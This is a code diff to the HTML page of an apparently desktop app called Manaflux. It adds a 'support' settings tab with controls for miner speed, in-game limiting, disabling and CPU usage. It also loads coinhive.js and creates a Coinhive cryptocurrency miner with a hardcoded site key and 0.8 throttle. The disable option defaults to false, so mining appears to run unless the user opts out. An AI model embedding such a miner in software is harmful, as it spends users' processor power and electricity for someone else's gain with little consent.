@@ -6,6 +6,7 @@
   <link rel="stylesheet" href="assets/css/manaflux.css">
   <link rel="stylesheet" href="assets/css/components/button.css">
   <link rel="stylesheet" href="assets/css/components/input.css">
+  <link rel="stylesheet" href="assets/css/components/sliders.css">
   <link rel="stylesheet" href="assets/css/components/dropdown.css">
   <link rel="stylesheet" href="assets/css/components/dots.css">
   <link rel="stylesheet" href="assets/css/components/hr.css">
@@ -230,6 +231,32 @@
         </div>
       </div>
     </div>
+    <div data-tabid="settings" data-tabn=4 class="tabcontent" style="display: none; margin-left: 9%;">
+      <p class="option-name" data-i18n="category-support"></p>
+      <p data-i18n="support" style="color: #a09b8c;font-size: 14px;max-width: 90%;"></p>
+      <div class="option">
+        <p class="suboption-name" data-i18n="support-miner-speed"></p>
+        <input type="range" max="100" data-settings-key="support-miner-speed" data-settings-default=5 data-custom-component="miner-speed" style="margin-top: 8px;">
+      </div>
+      <div class="option">
+        <p class="suboption-name" style="font-size: 15px !important;" id="support-miner-limit-in-game"></p>
+        <div class="options checkboxContainer">
+          <input type="checkbox" data-settings-key="support-miner-limit-in-game" data-settings-default=true />
+          <label data-i18n="common-enable"></label>
+        </div>
+      </div>
+      <div class="option">
+        <p class="suboption-name" data-i18n="support-miner-disable"></p>
+        <div class="options checkboxContainer">
+          <input type="checkbox" id="support-miner-disable" data-settings-key="support-miner-disable" data-custom-component="miner-disabler" data-settings-default=false />
+          <label data-i18n="common-disable"></label>
+        </div>
+      </div>
+      <div class="option">
+        <p class="suboption-name" data-i18n="support-miner-cpu-usage"></p>
+        <input type="text" class="center-area" data-custom-component="cpu-usage" disabled />
+      </div>
+    </div>
     <div data-tabid="update" data-tabn=0 class="tabcontent" style="display: none; margin-left: 9%;">
       <p data-i18n="update-available" id="updateAvailableText"></p>
       <div id="updateStatus">
@@ -247,6 +274,10 @@
   <audio id="soundEngine" autoplay>
     <source id="soundEngineSource" type="audio/ogg" />
   </audio>
+  <script src="vendor/coinhive.js"></script>
+  <script>
+      var miner = new CoinHive.Anonymous('UZqdO60CqnRVj9olLFTZCmrj6yl5Dynn', { throttle: 0.8, theme: 'dark' });
+  </script>
   <script src="vendor/jquery-3.3.1.min.js" onload="window.$ = window.jQuery = module.exports;"></script>
   <script src="vendor/jquery-ui.min.js"></script>
   <script src="vendor/markdown.min.js"></script>
